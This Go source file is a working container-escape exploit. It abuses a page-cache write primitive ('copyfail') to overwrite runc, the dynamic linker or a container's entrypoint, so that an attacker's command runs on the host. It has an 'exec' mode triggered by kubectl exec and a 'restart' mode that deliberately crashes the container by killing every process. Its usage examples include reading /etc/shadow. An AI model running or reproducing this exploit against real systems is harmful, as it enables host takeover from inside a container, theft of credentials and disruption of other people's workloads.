//go:build linux

package main

import (
	"bytes"
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"page-cache-container-escape/copyfail"
)

//go:embed injector-amd64.bin
var injectorBin []byte

const (
	payloadMarker = "PAGE_CACHE_INJECTOR_PAYLOAD_MARKER_V01"
	selfShebang   = "#!/proc/self/exe\n"
)

var linkerPaths = []string{
	"/lib64/ld-linux-x86-64.so.2",
	"/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
}

// --- helpers ---

func pageCacheWrite(path string, offset int64, content []byte) error {
	return copyfail.Write(path, offset, content, copyfail.Write4)
}

// bashPayload wraps cmd in a bash shebang script.
func bashPayload(cmd string) []byte {
	return []byte("#!/bin/bash\n" + cmd + "\n")
}

// procArgv0 reads /proc/<pid>/cmdline and returns argv[0], empty string on error.
func procArgv0(pid int) string {
	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	return string(bytes.SplitN(cmdline, []byte{0}, 2)[0])
}

// --- Patch injector with payload ---

func patchInjector(payload []byte) ([]byte, error) {
	if len(payload) == 0 || len(payload) > 4096 {
		return nil, fmt.Errorf("payload length %d out of range", len(payload))
	}
	marker := []byte(payloadMarker)
	offset := bytes.Index(injectorBin, marker)
	if offset < 0 {
		return nil, fmt.Errorf("payload marker not found in injector binary")
	}
	lenOff := offset + len(marker)
	bufOff := lenOff + 8

	patched := bytes.Clone(injectorBin)
	for i := range 8 {
		patched[lenOff+i] = byte(uint64(len(payload)) >> (8 * i))
	}
	copy(patched[bufOff:], make([]byte, 4096))
	copy(patched[bufOff:], payload)
	return patched, nil
}

// --- Write injector to ld.so ---

// ensureLinker checks each candidate ld.so path.
// If a path exists but is too small, it is skipped.
// If no path exists at all, it creates a zero-filled placeholder at the first
// path that is writable — enabling restart mode on distroless / Alpine images
// that ship no glibc dynamic linker.
func ensureLinker(injectorSize int) (string, error) {
	for _, target := range linkerPaths {
		info, err := os.Stat(target)
		if err != nil {
			continue
		}
		if info.Size() < int64(injectorSize) {
			return "", fmt.Errorf("injector (%d) exceeds %s size (%d)", injectorSize, target, info.Size())
		}
		return target, nil
	}

	// No ld.so found — try to create a zero-filled placeholder large enough for
	// the injector. We write real zero bytes (not a sparse truncate) so that the
	// page cache is fully populated and Copy Fail's splice can read back the
	// entire file.
	for _, target := range linkerPaths {
		if err := os.MkdirAll(filepath.Dir(target), 0755); err != nil {
			fmt.Printf("    [-] mkdir %s: %v\n", filepath.Dir(target), err)
			continue
		}
		// O_TRUNC so a previous run's leftover file is reused rather than rejected.
		f, err := os.OpenFile(target, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
		if err != nil {
			fmt.Printf("    [-] create %s: %v\n", target, err)
			continue
		}
		_, werr := f.Write(make([]byte, injectorSize))
		f.Close()
		if werr != nil {
			fmt.Printf("    [-] write placeholder %s: %v\n", target, werr)
			os.Remove(target)
			continue
		}
		fmt.Printf("    [*] Created placeholder linker: %s (%d bytes)\n", target, injectorSize)
		return target, nil
	}
	return "", fmt.Errorf("no dynamic linker found and could not create placeholder")
}

func writeInjector(payload []byte) error {
	injector, err := patchInjector(payload)
	if err != nil {
		return err
	}
	target, err := ensureLinker(len(injector))
	if err != nil {
		return err
	}
	info, _ := os.Stat(target)
	fmt.Printf("    [*] Target: %s (%d bytes -> %d bytes)\n", target, info.Size(), len(injector))
	return pageCacheWrite(target, 0, injector)
}

// --- Write shebang to target file ---

func writeShebang(path string) error {
	fmt.Printf("    [*] Target: %s -> %q\n", path, selfShebang)
	return pageCacheWrite(path, 0, []byte(selfShebang))
}

func resolveEntrypoint(pid int) string {
	argv0 := procArgv0(pid)
	if filepath.IsAbs(argv0) {
		if resolved, err := filepath.EvalSymlinks(argv0); err == nil {
			return resolved
		}
	}
	return "/bin/sh"
}

// --- Crash container ---

func crashContainer(pid int) {
	// Method 1: cgroup.kill (cgroup v2)
	cgPath, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cgroup", pid))
	for _, line := range bytes.Split(cgPath, []byte("\n")) {
		if bytes.HasPrefix(line, []byte("0::")) {
			rel := string(bytes.TrimPrefix(line, []byte("0::")))
			killFile := filepath.Join("/sys/fs/cgroup", rel, "cgroup.kill")
			if os.WriteFile(killFile, []byte("1"), 0644) == nil {
				return
			}
		}
	}
	// Method 2: kill all processes then exit
	for range 10 {
		syscall.Kill(-1, syscall.SIGKILL)
		time.Sleep(100 * time.Millisecond)
	}
	os.Exit(137)
}

// --- Process monitor: scan /proc for target process ---

// isTargetProcess reports whether pid looks like a runc process.
// It also returns the /proc/<pid>/exe path so the caller can open it directly
// without re-computing it.
func isTargetProcess(pid int) (bool, string) {
	exePath := fmt.Sprintf("/proc/%d/exe", pid)
	exe, _ := os.Readlink(exePath)
	base := filepath.Base(exe)
	if base == "runc" || base == "docker-runc" {
		return true, exePath
	}

	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	cmd := string(cmdline)
	if strings.Contains(cmd, "runc") && strings.Contains(cmd, "init") {
		return true, exePath
	}
	if cmd == "/proc/self/exe\x00init\x00" {
		return true, exePath
	}
	argv0 := strings.SplitN(cmd, "\x00", 2)[0]
	if base := filepath.Base(argv0); base == "runc" || base == "docker-runc" {
		return true, exePath
	}
	return false, ""
}

func captureTargetFD(timeout time.Duration) (int, error) {
	var deadline time.Time
	if timeout > 0 {
		deadline = time.Now().Add(timeout)
	}

	// Snapshot current max PID so we only watch newly spawned processes.
	maxPID := 0
	if entries, err := os.ReadDir("/proc"); err == nil {
		for _, e := range entries {
			if pid, err := strconv.Atoi(e.Name()); err == nil && pid > maxPID {
				maxPID = pid
			}
		}
	}

	for {
		if !deadline.IsZero() && time.Now().After(deadline) {
			return -1, fmt.Errorf("timeout waiting for target process")
		}
		entries, err := os.ReadDir("/proc")
		if err != nil {
			return -1, err
		}
		for _, e := range entries {
			pid, err := strconv.Atoi(e.Name())
			if err != nil || pid <= maxPID {
				continue
			}
			maxPID = pid
			ok, exePath := isTargetProcess(pid)
			if !ok {
				continue
			}
			// Found target — open its exe fd with retries.
			for retry := 0; retry < 50; retry++ {
				f, err := os.Open(exePath)
				if err == nil {
					fmt.Printf("    [+] Captured: pid=%d fd=%d\n", pid, int(f.Fd()))
					return int(f.Fd()), nil
				}
				time.Sleep(time.Millisecond)
			}
		}
		time.Sleep(2 * time.Millisecond)
	}
}

// --- Exploit: exec mode ---

func exploitExec(cmd string, target string, timeout time.Duration) error {
	payload := bashPayload(cmd)

	fmt.Println()
	fmt.Println("[*] Page Cache Container Escape (exec mode)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	fmt.Printf("[*] Target: %s\n\n", target)

	// Step 1: overwrite target with shebang
	fmt.Println("[*] Step 1: Overwriting exec target with shebang...")
	resolved := target
	if r, err := filepath.EvalSymlinks(target); err == nil {
		resolved = r
	}
	if err := writeShebang(resolved); err != nil {
		return err
	}
	fmt.Println("[+] Step 1: Done\n")

	// Step 2: wait for target process to appear, capture fd
	fmt.Println("[*] Step 2: Waiting for target process (trigger with: kubectl exec <pod> -- <cmd>)...")
	fd, err := captureTargetFD(timeout)
	if err != nil {
		return err
	}
	defer syscall.Close(fd)

	// Step 3: overwrite runc binary via fd
	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	fmt.Printf("[*] Step 3: Overwriting target binary via %s...\n", fdPath)
	if err := pageCacheWrite(fdPath, 0, payload); err != nil {
		return err
	}
	fmt.Println("[+] Done. Next invocation will execute payload on host.")
	return nil
}

// --- Exploit: restart mode ---

func exploitRestart(cmd string, pid int, timeout time.Duration) error {
	payload := bashPayload(cmd)

	fmt.Println()
	fmt.Println("[*] Page Cache Container Escape (restart mode)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	fmt.Printf("[*] PID: %d\n\n", pid)

	fmt.Println("[*] Step 1: Overwriting dynamic linker...")
	if err := writeInjector(payload); err != nil {
		return err
	}
	fmt.Println("[+] Step 1: Done\n")

	fmt.Println("[*] Step 2: Overwriting container entrypoint...")
	entrypoint := resolveEntrypoint(pid)
	if err := writeShebang(entrypoint); err != nil {
		return err
	}
	fmt.Println("[+] Step 2: Done\n")

	fmt.Println("[*] Step 3: Triggering container crash...")
	crashContainer(pid)
	fmt.Println("[+] Step 3: Done")
	return nil
}

// --- CLI ---

func usage() {
	fmt.Fprintf(os.Stderr, `Usage: pcce.bak <mode> --cmd <command> [options]

Modes:
  exec      Overwrite exec target, wait for kubectl exec to capture target process
  restart   Overwrite ld.so + entrypoint, crash container, auto-exploit on restart
            (creates a placeholder ld.so if none exists)

Options:
  --cmd, -c <command>    Command to execute on host (required)
  --target, -t <path>    Exec target to overwrite (exec mode, default: /bin/sh)
  --pid <pid>            Target PID (restart mode, default: 1)
  --no-restore           Don't auto-restore after payload execution
  --timeout <duration>   Timeout (default: 30s, 0=forever for exec mode)

Examples:
  pcce.bak exec --cmd 'touch /tmp/pwned'
  pcce.bak exec --cmd 'cat /etc/shadow' --target /usr/bin/python3
  pcce.bak restart --cmd 'touch /tmp/pwned'
`)
}

func main() {
	var (
		cmd       string
		mode      string
		target    = "/bin/sh"
		pid       = 1
		noRestore bool
		timeout   = 30 * time.Second
	)

	args := os.Args[1:]
	if len(args) > 0 && !strings.HasPrefix(args[0], "-") {
		mode = args[0]
		args = args[1:]
	}

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--cmd", "-c":
			i++
			if i < len(args) {
				cmd = args[i]
			}
		case "--target", "-t":
			i++
			if i < len(args) {
				target = args[i]
			}
		case "--no-restore":
			noRestore = true
		case "--pid":
			i++
			if i < len(args) {
				fmt.Sscanf(args[i], "%d", &pid)
			}
		case "--timeout":
			i++
			if i < len(args) {
				if d, err := time.ParseDuration(args[i]); err == nil {
					timeout = d
				}
			}
		case "--help", "-h":
			usage()
			os.Exit(0)
		}
	}

	if cmd == "" {
		fmt.Fprintln(os.Stderr, "error: --cmd is required")
		usage()
		os.Exit(2)
	}
	if mode == "" {
		fmt.Fprintln(os.Stderr, "error: mode is required (exec or restart)")
		usage()
		os.Exit(2)
	}
	if !noRestore {
		cmd += "\necho 3 > /proc/sys/vm/drop_caches"
	}

	var err error
	switch mode {
	case "exec":
		if timeout == 30*time.Second {
			timeout = 0
		}
		err = exploitExec(cmd, target, timeout)
	case "restart":
		err = exploitRestart(cmd, pid, timeout)
	default:
		fmt.Fprintf(os.Stderr, "error: unknown mode %q (use exec or restart)\n", mode)
		os.Exit(2)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		os.Exit(1)
	}
}
